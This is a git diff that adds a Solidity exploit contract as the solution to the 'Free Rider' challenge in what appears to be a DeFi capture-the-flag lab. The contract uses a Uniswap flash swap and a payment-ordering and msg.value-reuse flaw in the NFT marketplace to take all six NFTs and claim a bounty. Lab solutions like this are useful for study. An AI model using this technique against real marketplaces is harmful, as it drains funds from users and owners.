@@ -123,7 +123,8 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        Attack attack = new Attack(weth, uniswapPair, marketplace, recoveryManager, nft, player);
+        attack.attack();
     }
 
     /**
@@ -145,4 +146,65 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+}
+
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+contract Attack is IERC721Receiver{
+    WETH weth;
+    IUniswapV2Pair uniswapPair;
+    FreeRiderNFTMarketplace marketplace;
+    FreeRiderRecoveryManager recoveryManager;
+    DamnValuableNFT nft;
+    address player;
+    uint256 constant NFT_PRICE = 15 ether;
+
+    constructor(WETH _weth, IUniswapV2Pair _uniswapPair, FreeRiderNFTMarketplace _marketplace, FreeRiderRecoveryManager _recoveryManager, DamnValuableNFT _nft, address _player) {
+        weth = _weth;
+        uniswapPair = _uniswapPair;
+        marketplace = _marketplace;
+        recoveryManager = _recoveryManager;
+        nft = _nft;
+        player = _player;
+    }
+
+    /** @dev attack will get temporary ETH from Uniswap via a flash swap (loan) */
+    function attack() public {
+        uniswapPair.swap(NFT_PRICE, 0, address(this), 'x');
+    }
+
+    /** @dev UniswapV2Pair inherently calls uniswapV2Call, so we define it in this contract to handle the transfer logic.*/
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        uint256[] memory tokenIds = new uint256[](6);
+        //Since we have a constant of 6 NFTs we can easily setup the tokenIds we want
+        for(uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+        //Convert WETH into ETH
+        weth.withdraw(NFT_PRICE);
+        //Exploit _buyOne since the transfer happens before paying the original Owner of the NFT
+        marketplace.buyMany{value: NFT_PRICE}(tokenIds);
+        //After we get all the NFTs, we simply transfer to the recovery contract
+        for(uint256 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(player));
+        }
+
+        //Finally we need to calculate the fee (standard Uniswap fee), and convert the ETH back to WETH before paying back the loan.
+        uint256 fee = (NFT_PRICE * 3) / 997 + 1;
+        weth.deposit{value: 15e18 + fee}();
+        weth.transfer(msg.sender, 15e18 + fee);
+    }
+
+    /** @dev Since this contract will receive the NFTs it requires onERC721Received.*/
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external override returns (bytes4) {
+
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
 }
